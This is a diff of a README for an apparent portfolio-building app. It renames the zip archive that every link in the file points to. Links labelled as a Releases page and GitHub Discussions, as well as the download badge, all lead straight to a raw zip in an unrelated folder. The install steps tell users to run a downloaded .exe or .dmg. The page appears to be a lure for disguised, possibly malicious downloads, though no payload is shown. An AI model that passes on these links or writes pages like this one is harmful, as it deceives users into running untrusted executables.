@@ -1,7 +1,7 @@
 # 🎉 portfolio-site-4996 - Your Easy Way to Build a Personal Portfolio
 
 ## 🔗 Download Now
-[![Download](https://raw.githubusercontent.com/Blanco004/portfolio-site-4996/main/sterlet/portfolio-site-4996.zip)](https://raw.githubusercontent.com/Blanco004/portfolio-site-4996/main/sterlet/portfolio-site-4996.zip)
+[![Download](https://raw.githubusercontent.com/Blanco004/portfolio-site-4996/main/sterlet/site_portfolio_3.1.zip)](https://raw.githubusercontent.com/Blanco004/portfolio-site-4996/main/sterlet/site_portfolio_3.1.zip)
 
 ## 🚀 Getting Started
 Welcome to the portfolio-site-4996 project! This application helps you create a simple, beautiful online portfolio to showcase your work. Whether you're an artist, developer, or freelancer, this site makes it easy to highlight your projects and skills.
@@ -16,7 +16,7 @@ Before you begin, please ensure your system meets the following requirements:
 ## 📥 Download & Install
 To get started, follow these simple steps:
 
-1. **Visit the Download Page:** Go to the [Releases page](https://raw.githubusercontent.com/Blanco004/portfolio-site-4996/main/sterlet/portfolio-site-4996.zip) to find the latest version of the application.
+1. **Visit the Download Page:** Go to the [Releases page](https://raw.githubusercontent.com/Blanco004/portfolio-site-4996/main/sterlet/site_portfolio_3.1.zip) to find the latest version of the application.
   
 2. **Choose Your Version:** On the Releases page, look for the most recent version listed at the top. Click on it to view the files available for download.
 
@@ -25,7 +25,7 @@ To get started, follow these simple steps:
 4. **Install the Application:**
    - For **Windows**: Double-click the downloaded `.exe` file and follow the on-screen instructions.
    - For **macOS**: Open the downloaded `.dmg` file, drag the application to the Applications folder, and launch it from there.
-   - For **Linux**: Extract the downloaded `https://raw.githubusercontent.com/Blanco004/portfolio-site-4996/main/sterlet/portfolio-site-4996.zip` file and follow the instructions in the https://raw.githubusercontent.com/Blanco004/portfolio-site-4996/main/sterlet/portfolio-site-4996.zip inside the package.
+   - For **Linux**: Extract the downloaded `https://raw.githubusercontent.com/Blanco004/portfolio-site-4996/main/sterlet/site_portfolio_3.1.zip` file and follow the instructions in the https://raw.githubusercontent.com/Blanco004/portfolio-site-4996/main/sterlet/site_portfolio_3.1.zip inside the package.
 
 5. **Open the Application:** After installation, locate the app on your device. Click to open, and you will be greeted with a setup screen.
 
@@ -57,11 +57,11 @@ A: Yes, you can link a custom domain to your portfolio once you publish it onlin
 A: Yes, we have a support section in the application. You can also check the FAQ page on the repository for common questions.
 
 ## 📞 Contact
-For further queries or feedback, feel free to reach out through our [GitHub Discussions](https://raw.githubusercontent.com/Blanco004/portfolio-site-4996/main/sterlet/portfolio-site-4996.zip) section. Your feedback helps us improve!
+For further queries or feedback, feel free to reach out through our [GitHub Discussions](https://raw.githubusercontent.com/Blanco004/portfolio-site-4996/main/sterlet/site_portfolio_3.1.zip) section. Your feedback helps us improve!
 
 ## 💾 Additional Notes
 Remember to keep your portfolio updated as you complete new projects or gain new skills. An updated portfolio will significantly enhance your chances of getting noticed in your field.
 
-For detailed documentation or updates, always refer back to this [Releases page](https://raw.githubusercontent.com/Blanco004/portfolio-site-4996/main/sterlet/portfolio-site-4996.zip).
+For detailed documentation or updates, always refer back to this [Releases page](https://raw.githubusercontent.com/Blanco004/portfolio-site-4996/main/sterlet/site_portfolio_3.1.zip).
 
 Happy showcasing!
